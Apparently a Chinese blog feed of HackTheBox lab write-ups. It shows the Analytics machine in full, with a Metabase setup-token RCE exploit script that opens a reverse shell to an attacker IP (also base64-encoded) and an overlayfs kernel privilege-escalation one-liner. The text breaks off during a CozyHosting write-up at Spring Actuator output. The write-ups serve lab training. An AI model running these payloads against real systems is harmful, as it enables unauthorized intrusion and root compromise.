        <content type="html"><![CDATA[<p>HTB，启动！</p><p>靶机地址：<a href="https://app.hackthebox.com/machines/Analytics">https://app.hackthebox.com/machines/Analytics</a></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>先nmap扫下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.233 (10.10.11.233)</span><br><span class="line">Host is up (0.46s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE    SERVICE    VERSION</span><br><span class="line">22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">80/tcp    open     http       nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://analytical.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">4446/tcp  filtered n1-fwp</span><br><span class="line">8088/tcp  filtered radan-http</span><br><span class="line">34571/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>还是先想办法对web站点进行渗透，扫了一圈没啥东西，主页有个login功能：</p><p><img src="https://s2.loli.net/2024/02/06/K23FEdHJotXquRD.png" alt=""></p><p>是个开源项目metabase：<a href="https://github.com/metabase/metabase">https://github.com/metabase/metabase</a></p><p>curl了一下，找到了metabase版本：</p><p><img src="https://s2.loli.net/2024/02/06/4HsEAcBU9DPdK8X.png" alt=""></p><p>去找找有没有CVE，彳亍：</p><p><img src="https://s2.loli.net/2024/02/06/lCtq7LaWvU68mcY.png" alt=""></p><p>首先要访问api/session/properties，获取setup-token：</p><p><img src="https://s2.loli.net/2024/02/06/ONaymk5SJ1bKhjA.png" alt=""></p><p>得到setup-token：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  &quot;setup-token&quot;:&quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后构造恶意包利用URL的zip功能去加载db文件，metabase自带了一个H2的db文件，因此我们可以得以利用H2 RCE，根据PoC构造exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://data.analytical.htb/api/setup/validate&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;token&quot;</span>: <span class="string">&quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;</span>,</span><br><span class="line">    <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;is_on_demand&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;is_full_sync&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;is_sample&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;cache_ttl&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;refingerprint&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;auto_run_queries&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;schedules&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: <span class="string">&quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1\&quot;&#x27;)\n$$--=x&quot;</span>,</span><br><span class="line">            <span class="string">&quot;advanced-options&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;ssl&quot;</span>: <span class="literal">True</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;an-sec-research-team&quot;</span>,</span><br><span class="line">        <span class="string">&quot;engine&quot;</span>: <span class="string">&quot;h2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=data)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是打过去会400，单双引号转义会有点问题，需要base64编码一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://data.analytical.htb/api/setup/validate&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;token&quot;</span>: <span class="string">&quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;</span>,</span><br><span class="line">    <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;is_on_demand&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;is_full_sync&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;is_sample&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;cache_ttl&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;refingerprint&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;auto_run_queries&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;schedules&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: <span class="string">&quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQgMD4mMSAK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)\n$$--=x&quot;</span>,</span><br><span class="line">            <span class="string">&quot;advanced-options&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;ssl&quot;</span>: <span class="literal">True</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;an-sec-research-team&quot;</span>,</span><br><span class="line">        <span class="string">&quot;engine&quot;</span>: <span class="string">&quot;h2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=data)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>成功反弹shell：</p><p><img src="https://s2.loli.net/2024/02/06/AhU2jtyTQLaPJMb.png" alt=""></p><p>找文件啥都找不到，看了下系统进程发现还有三个老哥（x：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a71f5a7ce35c:~$ ps aux</span><br><span class="line">ps aux</span><br><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 metabase  3:34 java -XX:+IgnoreUnrecognizedVMOptions -Dfile.encoding=UTF-8 -Dlogfile.path=target/<span class="built_in">log</span> -XX:+CrashOnOutOfMemoryError -server -jar /app/metabase.jar</span><br><span class="line">   89 metabase  0:00 bash -c &#123;<span class="built_in">echo</span>,c2ggLWkgJj4gL2Rldi90Y3AvMTAuMTAuMTQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">   92 metabase  0:00 bash -i</span><br><span class="line">   94 metabase  0:00 sh -i</span><br><span class="line">  220 metabase  0:00 bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIwLzU1MyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">  223 metabase  0:00 bash -i</span><br><span class="line">  224 metabase  0:00 bash -i</span><br><span class="line">  336 metabase  0:00 bash -c &#123;<span class="built_in">echo</span>,L3RtcC9yZXYuZWxm&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">  339 metabase  0:00 bash -i</span><br><span class="line">  340 metabase  0:00 /bin/sh</span><br><span class="line">  390 metabase  2h06 grep -Rnw /proc -e docker</span><br><span class="line">  435 metabase  0:00 bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQgMD4mMSAK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">  438 metabase  0:00 bash -i</span><br><span class="line">  439 metabase  0:00 bash -i</span><br><span class="line">  444 metabase  0:00 ps aux</span><br></pre></td></tr></table></figure><p>翻了一圈，啥也没找到，这个应该是docker容器，查看了下系统变量，发现有一个用户名和密码：</p><p><img src="https://s2.loli.net/2024/02/06/vmiJGCZqENWw94t.png" alt=""></p><p>ssh成功连接，找到了用户flag：</p><p><img src="https://s2.loli.net/2024/02/06/YncZJ51iuQbfadV.png" alt=""></p><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>找不到有suid的程序，那就考虑系统版本有没有漏洞，查看下内核版本：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">metalytics@analytics:~$ uname -a</span><br><span class="line">Linux analytics 6.2.0-25-generic <span class="comment">#25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>找到了，我说home目录怎么一堆奇怪的字母目录（x</p><p><img src="https://s2.loli.net/2024/02/06/B8qRj3DyHQY9X6r.png" alt=""></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unshare -rm sh -c <span class="string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="string">&#x27;import os;import pty;os.setuid(0);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>拿到root flag：</p><p><img src="https://s2.loli.net/2024/02/06/1wl9zTGgUmvCsOc.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>假期打靶第二弹-CozyHosting</title>
      <link href="2024/02/05/hackthebox-machine-CozyHosting/"/>
      <url>2024/02/05/hackthebox-machine-CozyHosting/</url>
      
        <content type="html"><![CDATA[<p>HTB，启动！</p><p>靶机地址：<a href="https://app.hackthebox.com/machines/CozyHosting">https://app.hackthebox.com/machines/CozyHosting</a></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>先nmap搜集信息：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-05 12:15 CST</span><br><span class="line">Nmap scan report for 10.10.11.230 (10.10.11.230)</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)</span><br><span class="line">|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cozyhosting.htb</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.72 seconds</span><br></pre></td></tr></table></figure><p>服务很少，打点的初步思路就是通过80端口来利用，然后目标机器的话是个Linux服务器。</p><p>访问web服务，初步探测信息如下：</p><p><img src="https://s2.loli.net/2024/02/05/wFSTjraW7oKbXvA.png" alt=""></p><p>然后看注释，发现用了一个叫NiceAdmin的框架：<a href="https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/">https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/</a></p><p><img src="https://s2.loli.net/2024/02/05/XCPLkMNjyHwpZmb.png" alt=""></p><p>上个扫描器扫下目录：</p><p><img src="https://s2.loli.net/2024/02/05/PWIDqvFtBQwHm61.png" alt=""></p><p>发现Actuator，那看来是springboot了。</p><blockquote><p>Actuator 是 SpringBoot 项目中一个非常强大一个功能，有助于对应用程序进行监视和管理，通过 restful api 请求来监管、审计、收集应用的运行情况。</p><p>  Actuator 的核心是端点 Endpoint，它用来监视应用程序及交互，spring-boot-actuator  中已经内置了非常多的  Endpoint（health、info、beans、metrics、httptrace、shutdown等等），同时也允许我们自己扩展自己的  Endpoints。每个 Endpoint 都可以启用和禁用。要远程访问 Endpoint，还必须通过 JMX 或 HTTP  进行暴露，大部分应用选择HTTP，Endpoint 的ID默认映射到一个带 <strong>/actuator</strong> 前缀的URL。例如，health 端点默认映射到 <strong>/actuator/health</strong>。</p></blockquote><p>访问这个路由有如下信息：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;_links&quot;</span>:&#123;<span class="attr">&quot;self&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">false</span>&#125;,<span class="attr">&quot;sessions&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator/sessions&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">false</span>&#125;,<span class="attr">&quot;beans&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator/beans&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">false</span>&#125;,<span class="attr">&quot;health-path&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator/health/&#123;*path&#125;&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">true</span>&#125;,<span class="attr">&quot;health&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator/health&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">false</span>&#125;,<span class="attr">&quot;env&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator/env&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">false</span>&#125;,<span class="attr">&quot;env-toMatch&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator/env/&#123;toMatch&#125;&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">true</span>&#125;,<span class="attr">&quot;mappings&quot;</span>:&#123;<span class="attr">&quot;href&quot;</span>:<span class="string">&quot;http://localhost:8080/actuator/mappings&quot;</span>,<span class="attr">&quot;templated&quot;</span>:<span class="literal">false</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>访问：<a href="http://cozyhosting.htb/actuator/env，得到：">http://cozyhosting.htb/actuator/env，得到：</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;activeProfiles&quot;</span>:[],<span class="attr">&quot;propertySources&quot;</span>:[&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;server.ports&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;local.server.port&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;&#125;&#125;,&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;servletContextInitParams&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;&#125;&#125;,&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;systemProperties&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;java.specification.version&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.jnu.encoding&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.class.path&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.vendor&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.arch.data.model&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vendor.url&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;catalina.useNaming&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;user.timezone&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;org.jboss.logging.provider&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.specification.version&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;os.name&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.java.launcher&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;user.country&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.boot.library.path&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.java.command&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;jdk.debug&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.cpu.endian&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;user.home&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;user.language&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.specification.vendor&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.version.date&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.home&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;file.separator&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.compressedOopsMode&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;line.separator&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.specification.name&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.specification.vendor&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;FILE_LOG_CHARSET&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.awt.headless&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.protocol.handler.pkgs&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.management.compiler&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.runtime.version&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;user.name&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;path.separator&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;os.version&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.runtime.name&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;file.encoding&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.name&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vendor.url.bug&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.io.tmpdir&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;catalina.home&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;com.zaxxer.hikari.pool_number&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.version&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;user.dir&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;os.arch&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.specification.name&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;PID&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;CONSOLE_LOG_CHARSET&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;catalina.base&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;native.encoding&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.library.path&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.info&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vendor&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.vm.version&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;sun.io.unicode.encoding&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;,<span class="attr">&quot;java.class.version&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>&#125;&#125;&#125;,&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;systemEnvironment&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;PATH&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;PATH\&quot;&quot;</span>&#125;,<span class="attr">&quot;INVOCATION_ID&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;INVOCATION_ID\&quot;&quot;</span>&#125;,<span class="attr">&quot;JOURNAL_STREAM&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;JOURNAL_STREAM\&quot;&quot;</span>&#125;,<span class="attr">&quot;SHELL&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;SHELL\&quot;&quot;</span>&#125;,<span class="attr">&quot;LOGNAME&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;LOGNAME\&quot;&quot;</span>&#125;,<span class="attr">&quot;SYSTEMD_EXEC_PID&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;SYSTEMD_EXEC_PID\&quot;&quot;</span>&#125;,<span class="attr">&quot;USER&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;USER\&quot;&quot;</span>&#125;,<span class="attr">&quot;LANG&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;LANG\&quot;&quot;</span>&#125;,<span class="attr">&quot;HOME&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;System Environment Property \&quot;HOME\&quot;&quot;</span>&#125;&#125;&#125;,&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;Config resource &#x27;class path resource [application.properties]&#x27; via location &#x27;optional:classpath:/&#x27;&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;server.address&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 1:16&quot;</span>&#125;,<span class="attr">&quot;server.servlet.session.timeout&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 2:32&quot;</span>&#125;,<span class="attr">&quot;management.endpoints.web.exposure.include&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 3:43&quot;</span>&#125;,<span class="attr">&quot;management.endpoint.sessions.enabled&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 4:40&quot;</span>&#125;,<span class="attr">&quot;spring.datasource.driver-class-name&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 5:37&quot;</span>&#125;,<span class="attr">&quot;spring.jpa.database-platform&quot;</span>:&#123;<span 